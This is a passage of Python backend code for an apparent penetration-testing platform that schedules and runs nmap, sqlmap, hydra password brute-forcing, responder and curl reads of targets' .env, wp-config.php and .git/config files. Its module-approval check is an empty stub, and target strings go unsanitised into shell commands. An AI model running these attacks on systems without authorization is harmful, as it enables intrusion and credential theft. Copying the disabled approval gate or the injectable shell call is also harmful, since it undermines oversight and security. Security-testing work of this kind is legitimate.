    if assessment_risk_mode != requested_risk_mode and requested_risk_mode == "intrusive":
        raise HTTPException(status_code=409, detail="Assessment risk mode does not allow intrusive execution")
    return assessment


def ensure_module_approval(assessment_id: str, module, risk_mode: str) -> dict[str, Any] | None:
    return None

def register_active_process(job_id: str, process: subprocess.Popen[str]) -> None:
    if not job_id or job_id in {"temp", "destructive"}:
        return
    with PROCESS_LOCK:
        ACTIVE_PROCESSES[job_id] = process

def unregister_active_process(job_id: str, process: subprocess.Popen[str] | None = None) -> None:
    if not job_id or job_id in {"temp", "destructive"}:
        return
    with PROCESS_LOCK:
        current = ACTIVE_PROCESSES.get(job_id)
        if current is None:
            return
        if process is not None and current is not process:
            return
        ACTIVE_PROCESSES.pop(job_id, None)

def request_stop(job_id: str) -> None:
    with PROCESS_LOCK:
        STOP_REQUESTS.add(job_id)

def clear_stop_request(job_id: str) -> None:
    with PROCESS_LOCK:
        STOP_REQUESTS.discard(job_id)
        COMMAND_RESULT_CACHE.pop(job_id, None)

def is_stop_requested(job_id: str) -> bool:
    with PROCESS_LOCK:
        return job_id in STOP_REQUESTS

def has_active_process(job_id: str) -> bool:
    with PROCESS_LOCK:
        process = ACTIVE_PROCESSES.get(job_id)
    return process is not None and process.poll() is None

def normalize_cache_command(command: str) -> str:
    normalized = re.sub(r"\s+", " ", str(command or "").strip())
    if normalized.startswith("exec "):
        normalized = normalized[5:].strip()
    return normalized

def get_cached_command_result(job_id: str, command: str) -> dict[str, Any] | None:
    cache_key = normalize_cache_command(command)
    if not job_id or job_id in {"temp", "destructive"} or not cache_key:
        return None
    with PROCESS_LOCK:
        job_cache = COMMAND_RESULT_CACHE.get(job_id, {})
        cached = job_cache.get(cache_key)
    return dict(cached) if isinstance(cached, dict) else None

def set_cached_command_result(job_id: str, command: str, result: dict[str, Any]) -> None:
    cache_key = normalize_cache_command(command)
    if not job_id or job_id in {"temp", "destructive"} or not cache_key:
        return
    with PROCESS_LOCK:
        job_cache = COMMAND_RESULT_CACHE.setdefault(job_id, {})
        job_cache[cache_key] = dict(result)

def process_pid_running(pid: int | None) -> bool:
    if not pid or pid <= 0:
        return False
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False

def runtime_meta(job: dict[str, Any] | None) -> dict[str, Any]:
    if not job:
        return {}
    value = job.get("runtime_meta")
    return value if isinstance(value, dict) else {}

def runtime_int(meta: dict[str, Any], key: str, default: int = 0) -> int:
    try:
        return int(meta.get(key, default))
    except (TypeError, ValueError):
        return default

def update_runtime_meta(job_id: str, **changes: Any) -> None:
    try:
        job = JOB_STORE.get_job(job_id)
        if not job:
            return
        meta = {**runtime_meta(job)}
        meta.update(changes)
        JOB_STORE.update_job(job_id, runtime_meta=meta, updated_at=now_iso())
    except Exception:
        pass

def clear_runtime_meta(job_id: str) -> None:
    try:
        job = JOB_STORE.get_job(job_id)
        if not job:
            return
        JOB_STORE.update_job(job_id, runtime_meta={}, updated_at=now_iso())
    except Exception:
        pass

def stale_timeout_for_job(job: dict[str, Any] | None) -> int:
    meta = runtime_meta(job)
    tool_name = str(meta.get("tool") or "").strip().lower()
    command_timeout = runtime_int(meta, "timeout", COMMAND_TIMEOUT_SECONDS)
    slow_tools = {"nmap", "nuclei", "nikto", "gobuster", "hydra", "sqlmap", "ffuf", "dirsearch"}
    baseline = max(JOB_HEARTBEAT_TIMEOUT_SECONDS, command_timeout + 120)
    if tool_name in slow_tools:
        return max(baseline, min(1800, command_timeout * 2))
    return baseline

def target_tcp_reachable(target: str, ports: tuple[int, ...] = (80, 443, 22, 8080, 8443), timeout: float = 1.2) -> bool:
    for port in ports:
        try:
            with socket.create_connection((target, port), timeout=timeout):
                return True
        except OSError:
            continue
    return False

def target_ping_reachable(target: str, timeout_seconds: int = 1) -> bool:
    if shutil.which("ping") is None:
        return False
    command = f"ping -c 1 -W {timeout_seconds} {target}" if os.name == "posix" else f"ping -n 1 -w {timeout_seconds * 1000} {target}"
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=max(3, timeout_seconds + 2))
        return result.returncode == 0
    except Exception:
        return False

def target_preflight_reachable(target: str) -> bool:
    return target_tcp_reachable(target) or target_ping_reachable(target)

def stop_process_tree(process: subprocess.Popen[str]) -> None:
    if process.poll() is not None:
        return
    try:
        if os.name == "posix":
            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
            time.sleep(0.5)
            if process.poll() is None:
                os.killpg(os.getpgid(process.pid), signal.SIGKILL)
        else:
            process.terminate()
            time.sleep(0.5)
            if process.poll() is None:
                process.kill()
    except Exception:
        try:
            process.kill()
        except Exception:
            pass

def request_stop_job(job_id: str, reason: str = "Stop requested by operator.") -> dict[str, Any] | None:
    job = JOB_STORE.get_job(job_id)
    if not job:
        return None
    if str(job.get("status")) in {"completed", "failed", "stopped"}:
        return job

    request_stop(job_id)
    safe_append_log(job_id, f"🛑 {reason}", "warning")
    JOB_STORE.update_job(job_id, status="stopping", updated_at=now_iso())

    with PROCESS_LOCK:
        process = ACTIVE_PROCESSES.get(job_id)
    if process is not None:
        stop_process_tree(process)

    return JOB_STORE.get_job(job_id)

def mark_job_stopped(job_id: str, reason: str = "Job stopped by operator.") -> None:
    job = JOB_STORE.get_job(job_id)
    if not job:
        return
    logs = [*job["logs"], make_log(reason, severity="warning")]
    updated_runs: list[dict[str, Any]] = []
    for run in job["module_runs"]:
        status = str(run.get("status") or "queued")
        if status in {"queued", "running"}:
            updated_runs.append({**run, "status": "stopped", "completed_at": now_iso()})
        else:
            updated_runs.append(run)
    JOB_STORE.update_job(job_id, status="stopped", logs=logs, module_runs=updated_runs, runtime_meta={}, updated_at=now_iso())

def mark_job_failed_preflight(job_id: str, reason: str) -> None:
    job = JOB_STORE.get_job(job_id)
    if not job:
        return
    logs = [*job["logs"], make_log(reason, severity="critical")]
    updated_runs: list[dict[str, Any]] = []
    for run in job["module_runs"]:
        status = str(run.get("status") or "queued")
        next_status = "stopped" if status == "queued" else "failed"
        updated_runs.append({**run, "status": next_status, "completed_at": now_iso()})
    JOB_STORE.update_job(job_id, status="failed", progress=100, logs=logs, module_runs=updated_runs, runtime_meta={}, updated_at=now_iso())

def reconcile_job_state(job: dict[str, Any] | None) -> dict[str, Any] | None:
    if not job:
        return None

    status = str(job.get("status") or "")
    job_id = str(job.get("id"))
    meta = runtime_meta(job)
    heartbeat_at = parse_iso_timestamp(str(meta.get("heartbeat_at") or ""))
    updated_at = heartbeat_at or parse_iso_timestamp(str(job.get("updated_at") or "")) or parse_iso_timestamp(str(job.get("created_at") or ""))
    age_seconds = (datetime.now(timezone.utc) - updated_at).total_seconds() if updated_at else 0
    persisted_pid = runtime_int(meta, "pid", 0)
    persisted_running = process_pid_running(persisted_pid)
    stale_timeout_seconds = stale_timeout_for_job(job)

    if status in {"running", "pending"} and persisted_running:
        JOB_STORE.update_job(job_id, runtime_meta={**meta, "heartbeat_at": now_iso()}, updated_at=now_iso())
        return JOB_STORE.get_job(job_id)

    if status in {"running", "pending"} and not has_active_process(job_id) and not persisted_running and age_seconds > stale_timeout_seconds:
        logs = [*job["logs"], make_log(f"Job marked failed after stale heartbeat timeout ({int(age_seconds)}s > {stale_timeout_seconds}s).", severity="critical")]
        updated_runs: list[dict[str, Any]] = []
        for run in job["module_runs"]:
            run_status = str(run.get("status") or "queued")
            if run_status == "running":
                updated_runs.append({**run, "status": "failed", "completed_at": now_iso(), "highest_severity": "critical"})
            elif run_status == "queued":
                updated_runs.append({**run, "status": "stopped", "completed_at": now_iso()})
            else:
                updated_runs.append(run)
        JOB_STORE.update_job(job_id, status="failed", logs=logs, module_runs=updated_runs, runtime_meta={}, updated_at=now_iso())
        return JOB_STORE.get_job(job_id)

    if status != "stopping":
        return job

    if has_active_process(job_id):
        return job

    updated_at = parse_iso_timestamp(str(job.get("updated_at") or ""))
    now = datetime.now(timezone.utc)
    if updated_at is not None and (now - updated_at).total_seconds() < 2:
        return job

    mark_job_stopped(job_id, "Job auto-finalized after stop request.")
    return JOB_STORE.get_job(job_id)

def safe_update_progress(job_id: str, value: int) -> None:
    try:
        job = JOB_STORE.get_job(job_id)
        if job is None:
            return
        JOB_STORE.update_job(job_id, progress=max(0, min(100, value)), updated_at=now_iso())
    except Exception:
        pass

def compact_log_entries(existing: list[dict[str, Any]], message: str, severity: str = "info", dedup_window_seconds: int = 8) -> list[dict[str, Any]]:
    normalized_message = str(message or "").rstrip()
    if not existing:
        return [{"timestamp": now_iso(), "severity": severity, "message": normalized_message}]

    last = existing[-1]
    last_message = str(last.get("message") or "").rstrip()
    last_severity = str(last.get("severity") or "info")
    if normalized_message == last_message and severity == last_severity:
        last_ts = parse_iso_timestamp(str(last.get("timestamp") or ""))
        if last_ts and (datetime.now(timezone.utc) - last_ts).total_seconds() < dedup_window_seconds:
            return existing

    if not normalized_message and not last_message:
        return existing

    return [*existing, {"timestamp": now_iso(), "severity": severity, "message": normalized_message}]

def safe_append_log(job_id: str, message: str, severity: str = "info") -> None:
    try:
        job = JOB_STORE.get_job(job_id)
        if job is None:
            return
        logs = compact_log_entries(job.get("logs", []), message, severity)
        if logs == job.get("logs", []):
            return
        JOB_STORE.update_job(job_id, logs=logs, updated_at=now_iso())
    except Exception:
        pass

def safe_append_compact_log(job_id: str, message: str, severity: str = "info") -> None:
    safe_append_log(job_id, message, severity)

def unique_text_lines(values: list[str], limit: int = 20) -> list[str]:
    result: list[str] = []
    seen: set[str] = set()
    for value in values:
        text = str(value or "").strip()
        if not text:
            continue
        key = text.lower()
        if key in seen:
            continue
        seen.add(key)
        result.append(text)
        if len(result) >= limit:
            break
    return result

def compact_scan_output(output: str, tool: str, max_lines: int = 15) -> dict[str, Any]:
    lines = [line.strip() for line in str(output or "").splitlines() if line.strip()]
    if not lines:
        return {"summary": f"{tool} completed", "details": [], "total_lines": 0}
    important_keywords = {
        "nmap": ["open", "filtered", "host up", "vulnerable", "cve", "http-title", "http-headers", "ssl-cert"],
        "ffuf": ["status:", "redirect", "/"],
        "gobuster": ["status:", "found", "redirect"],
        "nikto": ["+", "!", "vulnerable", "outdated", "indexing", "header", "robots", "admin", "backup", "upload"],
        "httpx": ["http", "title", "server", "tech"],
        "whatweb": ["http", "apache", "nginx", "php", "wordpress", "drupal", "jquery"],
        "nuclei": ["[", "]", "cve", "critical", "high", "medium", "misconfig", "exposure"],
        "default": ["error", "warning", "found", "success", "vulnerable", "critical", "high"],
    }
    keywords = important_keywords.get(tool, important_keywords["default"])
    important = [line for line in lines if any(keyword in line.lower() for keyword in keywords)]
    if not important:
        important = lines[: min(5, len(lines))]
    return {"summary": f"{tool}: {len(important[:max_lines])} significant lines", "details": unique_text_lines(important, limit=max_lines), "total_lines": len(lines)}

def deduplicate_artifacts(artifacts: dict[str, Any]) -> dict[str, Any]:
    if not isinstance(artifacts, dict):
        return {}
    cleaned: dict[str, Any] = {}
    for key, value in artifacts.items():
        if value in (None, "", [], {}, False):
            continue
        if isinstance(value, list):
            unique_items: list[Any] = []
            seen: set[str] = set()
            for item in value:
                marker = json.dumps(item, sort_keys=True, default=str) if isinstance(item, (dict, list)) else str(item)
                if marker in seen:
                    continue
                seen.add(marker)
                unique_items.append(item)
            if unique_items:
                cleaned[key] = unique_items[:20]
        elif isinstance(value, dict):
            nested = {nested_key: nested_value for nested_key, nested_value in value.items() if nested_value not in (None, "", [], {}, False)}
            if nested:
                cleaned[key] = nested
        else:
            text = str(value)
            cleaned[key] = text[:1200] + ("..." if len(text) > 1200 else "")
    return cleaned

def evidence_fingerprint(item: dict[str, Any]) -> str:
    module_id = str(item.get("module_id") or "")
    summary = str(item.get("summary") or "").strip().lower()
    details = unique_text_lines([str(entry) for entry in item.get("details", [])], limit=5)
    artifact_keys = sorted(deduplicate_artifacts(item.get("artifacts", {})).keys())[:8]
    payload = {"module_id": module_id, "summary": summary, "details": details, "artifact_keys": artifact_keys}
    return json.dumps(payload, sort_keys=True)

def recompute_severity_summary(evidence: list[dict[str, Any]]) -> dict[str, int]:
    summary = blank_severity_summary()
    for item in evidence:
        severity = str(item.get("severity") or "info")
        summary[severity] = int(summary.get(severity, 0)) + 1
    return summary

def highest_severity_from_evidence(evidence: list[dict[str, Any]]) -> str:
    highest = "info"
    for item in evidence:
        severity = str(item.get("severity") or "info").lower()
        if SEVERITY_ORDER.get(severity, 0) > SEVERITY_ORDER.get(highest, 0):
            highest = severity
    return highest

def infer_tool_name(command: str) -> str:
    cmd = command.strip()
    if cmd.startswith("$ "):
        cmd = cmd[2:]
    base = cmd.split()[0] if cmd.split() else "command"
    return base

def format_elapsed_short(seconds: float) -> str:
    total = max(0, int(seconds))
    minutes, secs = divmod(total, 60)
    hours, minutes = divmod(minutes, 60)
    if hours:
        return f"{hours}h {minutes}m"
    if minutes:
        return f"{minutes}m {secs}s"
    return f"{secs}s"

def heartbeat_interval_for_tool(tool_name: str, elapsed: float) -> int:
    slow_tools = {"nmap", "nuclei", "nikto", "gobuster", "hydra", "sqlmap", "ffuf", "dirsearch"}
    if tool_name in slow_tools:
        if elapsed < 30:
            return 5
        if elapsed < 120:
            return 10
        if elapsed < 300:
            return 20
        return 30
    if elapsed < 20:
        return 5
    if elapsed < 60:
        return 8
    if elapsed < 180:
        return 15
    return 20

def progress_heartbeat_value(current_progress: int, elapsed: float, timeout: int) -> int:
    timeout = max(timeout, 1)
    projected = 50 + int((elapsed / timeout) * 25)
    return min(85, max(current_progress, projected))

def execute_command_with_progress(command: str, job_id: str, target: str = "", timeout: int = COMMAND_TIMEOUT_SECONDS, capture_output: bool = True, stdin_text: str | None = None) -> dict[str, Any]:
    safe_target = str(target).strip()
    
    raw_cmd = command
    cmd = raw_cmd
    if safe_target:
        cmd = (cmd.replace("TARGET", safe_target)
               .replace("lab.local", safe_target)
               .replace("target:443", f"{safe_target}:443")
               .replace("ssh://target", f"ssh://{safe_target}"))
    
    if cmd.startswith("$ "):
        cmd = cmd[2:]

    if os.name == "posix" and cmd and not cmd.startswith("exec "):
        cmd = f"exec {cmd}"
    
    validation_cmd = cmd[5:] if cmd.startswith("exec ") else cmd
    cmd_parts = validation_cmd.split()
    if cmd_parts:
        base_cmd = cmd_parts[0]
        effective_base_cmd = effective_base_command_from_parts(cmd_parts)
        allowed = False
        for aliases in TOOL_COMMAND_ALIASES.values():
            if aliases and effective_base_cmd in aliases:
                allowed = True
                break
        if not allowed and effective_base_cmd not in ["echo", "cat", "grep", "awk", "sed", "head", "tail", "ls", "pwd", "whoami", "scp", "ssh"]:
            return {"success": False, "stdout": "", "stderr": f"Command '{base_cmd}' not allowed", "returncode": -1, "command": cmd}
    
    tool_name = infer_tool_name(cmd[5:] if cmd.startswith("exec ") else cmd)
    cached_result = get_cached_command_result(job_id, cmd)
    if cached_result is not None:
        safe_append_compact_log(job_id, f"Reusing cached {tool_name} result for overlapping command", "info")
        return {**cached_result, "cached": True, "command": cmd}
    
    try:
        job = JOB_STORE.get_job(job_id)
        if job:
            current_progress = job.get("progress", 0)
            safe_update_progress(job_id, min(50, current_progress + 5))
        safe_append_log(job_id, f"⏳ Executing {tool_name}: {cmd[:120]}", "info")
    except Exception:
        pass
    
    try:
        stdout_target: Any = subprocess.PIPE if capture_output else subprocess.DEVNULL
        stderr_target: Any = subprocess.PIPE if capture_output else subprocess.DEVNULL
        process = subprocess.Popen(
            cmd,
            shell=True,
            start_new_session=(os.name == "posix"),
            stdin=subprocess.PIPE if stdin_text is not None else None,
            stdout=stdout_target,
            stderr=stderr_target,
            text=True,
            env={"PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "HOME": str(Path.home())}
        )
        register_active_process(job_id, process)
        if job_id and job_id not in {"temp", "destructive"}:
            update_runtime_meta(
                job_id,
                pid=process.pid,
                command=cmd,
                tool=tool_name,
                timeout=timeout,
                heartbeat_at=now_iso(),
                started_at=now_iso(),
            )
        
        start_time = time.time()
        last_heartbeat = 0.0
        
        while process.poll() is None:
            elapsed = time.time() - start_time
            if is_stop_requested(job_id):
                stop_process_tree(process)
                safe_append_log(job_id, f"🛑 {tool_name} stopped after {format_elapsed_short(elapsed)}", "warning")
                return {"success": False, "stdout": "", "stderr": "Command stopped by operator", "returncode": -2, "command": cmd, "cancelled": True}
            if elapsed >= timeout:
                stop_process_tree(process)
                safe_append_log(job_id, f"Command timeout for {tool_name} after {format_elapsed_short(elapsed)}", "warning")
                return {"success": False, "stdout": "", "stderr": f"Command timed out after {timeout} seconds", "returncode": -1, "command": cmd}
            heartbeat_interval = heartbeat_interval_for_tool(tool_name, elapsed)
            if elapsed - last_heartbeat >= heartbeat_interval:
                last_heartbeat = elapsed
                try:
                    safe_append_log(job_id, f"⏳ {tool_name} still running... {format_elapsed_short(elapsed)} elapsed", "info")
                    job = JOB_STORE.get_job(job_id)
                    if job:
                        current_progress = job.get("progress", 0)
                        next_progress = progress_heartbeat_value(current_progress, elapsed, timeout)
                        if next_progress > current_progress:
                            safe_update_progress(job_id, next_progress)
                    if job_id and job_id not in {"temp", "destructive"}:
                        update_runtime_meta(job_id, pid=process.pid, command=cmd, tool=tool_name, timeout=timeout, heartbeat_at=now_iso())
                except Exception:
                    pass
            time.sleep(1)
        
        finalize_timeout = max(10, min(30, timeout // 3 if timeout > 0 else 15))
        if job_id and job_id not in {"temp", "destructive"}:
            update_runtime_meta(job_id, pid=process.pid, command=cmd, tool=tool_name, timeout=timeout, heartbeat_at=now_iso())
        stdout, stderr = process.communicate(input=stdin_text, timeout=finalize_timeout)

        stdout = stdout if stdout else ""
        stderr = stderr if stderr else ""
        
        max_output = 1024 * 1024
        if len(stdout) > max_output:
            stdout = stdout[:max_output] + "\n... [output truncated]"
        if len(stderr) > max_output:
            stderr = stderr[:max_output] + "\n... [output truncated]"
        
        result_payload = {"success": process.returncode == 0, "stdout": stdout, "stderr": stderr, "returncode": process.returncode, "command": cmd}
        set_cached_command_result(job_id, cmd, result_payload)
        return result_payload
    except subprocess.TimeoutExpired as error:
        try:
            stop_process_tree(process)
        except Exception:
            try:
                process.kill()
            except Exception:
                pass
        partial_stdout = error.stdout if isinstance(error.stdout, str) else ""
        partial_stderr = error.stderr if isinstance(error.stderr, str) else ""
        if job_id:
            safe_append_log(job_id, f"{tool_name} finalization timed out while draining output pipes", "warning")
        return {
            "success": False,
            "stdout": partial_stdout,
            "stderr": partial_stderr or f"Command timed out after {timeout} seconds",
            "returncode": -1,
            "command": cmd,
        }
    except Exception as e:
        return {"success": False, "stdout": "", "stderr": str(e), "returncode": -1, "command": cmd}
    finally:
        unregister_active_process(job_id, process if "process" in locals() else None)
        if job_id and job_id not in {"temp", "destructive"}:
            clear_runtime_meta(job_id)

# ============ Core Functions ============
def module_execution_profile(module_id: str, execution_profile: str = "balanced") -> str:
    profile = normalize_execution_profile(execution_profile)
    return profile

def module_command_preview(module_id: str, target: str = "TARGET", execution_profile: str = "balanced") -> list[str]:
    web_wordlist = preferred_small_web_wordlist()
    password_wordlist = preferred_small_password_wordlist()
    user_wordlist = preferred_small_user_wordlist()
    profile = normalize_execution_profile(execution_profile)
    command_map: dict[str, dict[str, list[str]]] = {
        "recon-service-scan": {
            "fast": [
                f"nmap -Pn -n -sS -sV --version-light -T4 --top-ports 1000 --min-rate 1500 --max-retries 2 --open {target}",
                f"nmap -Pn -n -sV --version-light --max-retries 2 -T4 -p <open-ports> {target}",
                f"nmap -Pn -n --script http-title,http-headers,ssl-cert -p <web-ports> {target}",
            ],
            "balanced": [
                f"nmap -Pn -n -sS -sV --version-light -T4 --top-ports 1000 --min-rate 1500 --max-retries 2 --defeat-rst-ratelimit --open {target}",
                f"nmap -Pn -n -sC -sV --version-light --script-timeout 20s --max-retries 2 -T4 -p <open-ports> {target}",
                f"nmap -Pn -n --script http-title,http-headers,ssl-cert -p <web-ports> {target}",
            ],
            "deep": [
                f"nmap -Pn -n -sS -sV --version-all -T4 --top-ports 1500 --min-rate 1800 --max-retries 3 --open {target}",
                f"nmap -Pn -n -sC -sV --version-all --script-timeout 30s --max-retries 3 -T4 -p <open-ports> {target}",
                f"nmap -Pn -n --script http-title,http-headers,ssl-cert,vulners -p <web-ports> {target}",
            ],
        },
        "recon-host-discovery": {
            "fast": [f"nmap -sn -n {target}"],
            "balanced": [f"nmap -sn -n {target}"],
            "deep": [f"nmap -sn -n {target}", f"nmap -Pn -n -PS22,80,443 -PA80,443 {target}"],
        },
        "recon-dns-enumeration": {
            "fast": [f"dig {target} A +short", f"dnsx -silent -resp -a -ptr {target}"],
            "balanced": [f"dig {target} A +short", f"dig -x {target} +short", f"dnsx -silent -resp -a -ptr {target}"],
            "deep": [f"dig {target} ANY +short", f"dig -x {target} +short", f"dnsx -silent -resp -a -ptr {target}"],
        },
        "recon-amass-expansion": {
            "fast": [f"amass enum -passive -d {target}"],
            "balanced": [f"amass enum -passive -d {target}"],
            "deep": [f"amass enum -brute -src -d {target}"],
        },
        "baseline-web-fingerprint": {
            "fast": [f"httpx -u http://{target} -status-code -title -silent -timeout 10", f"whatweb -a 1 http://{target} -v --no-errors"],
            "balanced": [f"httpx -u http://{target} -status-code -title -tech-detect -tls-probe -silent -timeout 12", f"whatweb -a 3 http://{target} -v --no-errors"],
            "deep": [f"httpx -u http://{target} -status-code -title -tech-detect -tls-probe -web-server -server -silent -timeout 15", f"whatweb -a 4 http://{target} -v --no-errors"],
        },
        "web-security-header-audit": {
            "fast": [f"python3 /app/backend/wahidin_check_headers.py http://{target} --timeout 10"],
            "balanced": [f"python3 /app/backend/wahidin_check_headers.py http://{target} --timeout 12"],
            "deep": [f"python3 /app/backend/wahidin_check_headers.py http://{target} --timeout 15"],
        },
        "baseline-content-discovery": {
            "fast": [f"ffuf -u http://{target}/FUZZ -w {web_wordlist} -mc 200,301,302,403 -fc 404 -t 20 -timeout 8 -s -of json -o ffuf_{target}.json", f"# parse ffuf_{target}.json into status/path evidence"],
            "balanced": [f"ffuf -u http://{target}/FUZZ -w {web_wordlist} -mc 200,301,302,403 -fc 404 -t 30 -timeout 10 -s -of json -o ffuf_{target}.json", f"# parse ffuf_{target}.json into status/path evidence"],
            "deep": [f"ffuf -u http://{target}/FUZZ -w {web_wordlist} -mc 200,204,301,302,307,401,403 -fc 404 -t 40 -timeout 12 -s -of json -o ffuf_{target}.json", f"# parse ffuf_{target}.json into status/path evidence"],
        },
        "baseline-content-discovery-aggressive": {
            "fast": [f"ffuf -u http://{target}/FUZZ -w {web_wordlist} -mc 200,301,302,403 -fc 404 -t 20 -timeout 8 -s -of json -o ffuf_{target}.json", f"# parse ffuf_{target}.json into status/path evidence"],
            "balanced": [f"ffuf -u http://{target}/FUZZ -w {web_wordlist} -mc 200,301,302,403 -fc 404 -t 30 -timeout 10 -s -of json -o ffuf_{target}.json", f"# parse ffuf_{target}.json into status/path evidence"],
            "deep": [f"ffuf -u http://{target}/FUZZ -w {web_wordlist} -mc 200,204,301,302,307,401,403 -fc 404 -t 40 -timeout 12 -s -of json -o ffuf_{target}.json", f"# parse ffuf_{target}.json into status/path evidence"],
        },
        "baseline-nikto-review": {
            "fast": [
                f"nikto -h http://{target} -nointeractive -Tuning b -timeout 10",
                f"nuclei -u http://{target} -silent -rl 50 -c 10 -tags exposures,misconfig,default-login,tech",
            ],
            "balanced": [
                f"nikto -h http://{target} -nointeractive -timeout 15",
                f"nuclei -u http://{target} -silent -rl 80 -c 15 -tags exposures,misconfig,default-login,tech,cves",
            ],
            "deep": [
                f"nikto -h http://{target} -nointeractive -Tuning 123b -timeout 20",
                f"nuclei -u http://{target} -silent -rl 120 -c 25 -tags exposures,misconfig,default-login,tech,cves,vulnerabilities",
            ],
        },
        "baseline-gobuster-routes": {
            "fast": [f"ffuf -u http://{target}/FUZZ -w {web_wordlist} -ac -mc 200,301,302,403 -t 20 -timeout 8 -s -of json -o ffuf-routes-{target}.json", f"# ffuf auto-calibration helps when the target uses wildcard or fallback pages"],
            "balanced": [f"ffuf -u http://{target}/FUZZ -w {web_wordlist} -ac -mc 200,301,302,403 -t 25 -timeout 10 -s -of json -o ffuf-routes-{target}.json", f"# ffuf auto-calibration helps when the target uses wildcard or fallback pages"],
            "deep": [f"ffuf -u http://{target}/FUZZ -w {web_wordlist} -ac -mc 200,204,301,302,307,401,403 -t 30 -timeout 10 -s -of json -o ffuf-routes-{target}.json", f"gobuster dir -u http://{target} -w {web_wordlist} -k -q -x php,txt,bak,zip -t 30 --wildcard", f"# prefer ffuf -ac first; gobuster --wildcard is a noisier fallback when the site answers 200 on random paths"],
        },
        "baseline-tls-dns-review": {
            "fast": [f"openssl s_client -connect {target}:443 -servername {target} -tls1_2 < /dev/null 2>/dev/null | openssl x509 -noout -text"],
            "balanced": [f"sslyze --regular {target}:443", f"openssl s_client -connect {target}:443 -servername {target} -tls1_2 < /dev/null 2>/dev/null | openssl x509 -noout -text"],
            "deep": [f"sslyze --regular {target}:443", f"openssl s_client -connect {target}:443 -servername {target} -tls1_2 < /dev/null 2>/dev/null | openssl x509 -noout -text", f"dig -x {target} +short"],
        },
        "sensitive-file-discovery": {
            "fast": [f"curl -sk --range 0-24575 http://{target}/.env", f"curl -sk --range 0-24575 http://{target}/config.php", f"curl -sk --range 0-24575 http://{target}/wp-config.php"],
            "balanced": [f"curl -sk --range 0-24575 http://{target}/.env", f"curl -sk --range 0-24575 http://{target}/.git/config", f"curl -sk --range 0-24575 http://{target}/backup.sql", f"curl -sk --range 0-24575 http://{target}/storage/logs/laravel.log"],
            "deep": [f"curl -sk --range 0-24575 http://{target}/.env", f"curl -sk --range 0-24575 http://{target}/config.php", f"curl -sk --range 0-24575 http://{target}/wp-config.php", f"curl -sk --range 0-24575 http://{target}/.git/config", f"curl -sk --range 0-24575 http://{target}/backup.sql", f"curl -sk --range 0-24575 http://{target}/debug.log"],
        },
        "read-sensitive-file": {
            "fast": [f"curl -sk --range 0-4095 http://{target}/path/from-note"],
            "balanced": [f"curl -sk --range 0-16383 http://{target}/path/from-note"],
            "deep": [f"curl -sk --range 0-65535 http://{target}/path/from-note"],
        },
        "weapon-artifact-review": {
            "fast": [f"file sample.bin"],
            "balanced": [f"file sample.bin && sha256sum sample.bin"],
            "deep": [f"file sample.bin && sha256sum sample.bin && strings -n 8 sample.bin | head -n 20"],
        },
        "weapon-dropper-safety": {
            "fast": [f"sha256sum approved-artifact.bin"],
            "balanced": [f"sha256sum approved-artifact.bin && yara rules/lab-artifact-policy.yar approved-artifact.bin"],
            "deep": [f"sha256sum approved-artifact.bin && yara rules/lab-artifact-policy.yar approved-artifact.bin && strings -n 6 approved-artifact.bin | head -n 60"],
        },
        "weapon-defender-view": {
            "fast": [f"file sample.bin"],
            "balanced": [f"file sample.bin && sha256sum sample.bin"],
            "deep": [f"file sample.bin && sha256sum sample.bin && strings -n 6 sample.bin | head -n 80"],
        },
        "delivery-email-tabletop": {
            "fast": [f"swaks --server mail.lab.local --to user@lab.local --quit-after RCPT"],
            "balanced": [f"swaks --server mail.lab.local --to user@lab.local --from redteam@lab.local --quit-after RCPT"],
            "deep": [f"swaks --server mail.lab.local --to user@lab.local --from redteam@lab.local --quit-after DATA"],
        },
        "delivery-web-hosting-review": {
            "fast": [f"httpx -u http://{target} -status-code -title -silent"],
            "balanced": [f"httpx -u http://{target} -status-code -title -tech-detect -silent"],
            "deep": [f"httpx -u http://{target} -status-code -title -tech-detect -web-server -silent"],
        },
        "delivery-responder-awareness": {
            "fast": [f"responder -I eth0 -A"],
            "balanced": [f"responder -I eth0 -A && tcpdump -ni eth0 port 5355 or port 137"],
            "deep": [f"responder -I eth0 -A && tcpdump -ni eth0 port 5355 or port 137 or port 138"],
        },
        "exploit-sql-validation": {
            "fast": [f"sqlmap -u http://{target}/?id=1 --batch --risk=1 --level=1 --timeout=10"],
            "balanced": [f"sqlmap -u http://{target}/?id=1 --batch --risk=2 --level=2 --timeout=20"],
            "deep": [f"sqlmap -u http://{target}/?id=1 --batch --risk=3 --level=3 --threads=4 --timeout=30"],
        },
        "exploit-auth-control-review": {
            "fast": [f"hydra -L {user_wordlist} -e nsr -t 2 -f ssh://{target}"],
            "balanced": [f"hydra -L {user_wordlist} -P {password_wordlist} -t 4 -f ssh://{target}"],
            "deep": [f"hydra -L {user_wordlist} -P {password_wordlist} -t 4 -f -W 3 ssh://{target}"],
        },
        "exploit-session-review": {
            "fast": [f"jwt-tool -t http://{target} -M at"],
            "balanced": [f"jwt-tool -t http://{target} -M at && curl -skI http://{target}"],
            "deep": [f"jwt-tool -t http://{target} -M at -S hs256 && curl -skI http://{target}"],
        },
        "install-persistence-checklist": {
            "fast": [f"find /etc/cron* -maxdepth 2 -type f 2>/dev/null | head -n 20"],
            "balanced": [f"find /etc/cron* -maxdepth 2 -type f 2>/dev/null | head -n 40"],
            "deep": [f"find /etc/systemd /etc/cron* -type f 2>/dev/null | head -n 80"],
        },
        "install-registry-cron-audit": {
            "fast": [f"crontab -l"],
            "balanced": [f"crontab -l && systemctl list-timers --all"],
            "deep": [f"crontab -l && systemctl list-timers --all && find /etc/cron* -type f 2>/dev/null"],
        },
        "install-defender-recovery": {
            "fast": [f"systemctl list-unit-files --type=service | head -n 20"],
            "balanced": [f"systemctl list-unit-files --type=service | head -n 40"],
            "deep": [f"systemctl list-unit-files --type=service | head -n 80"],
        },
        "c2-telemetry-review": {
            "fast": [f"tcpdump -ni eth0 port 8000 or port 443 -c 10"],
            "balanced": [f"tcpdump -ni eth0 port 8000 or port 443 -c 20"],
            "deep": [f"tcpdump -ni eth0 port 8000 or port 443 or port 53 -c 30"],
        },
        "c2-tunnel-governance": {
            "fast": [f"proxychains4 curl -skI http://{target}"],
            "balanced": [f"proxychains4 curl -skI http://{target}"],
            "deep": [f"proxychains4 curl -skI http://{target}"],
        },
        "c2-framework-awareness": {
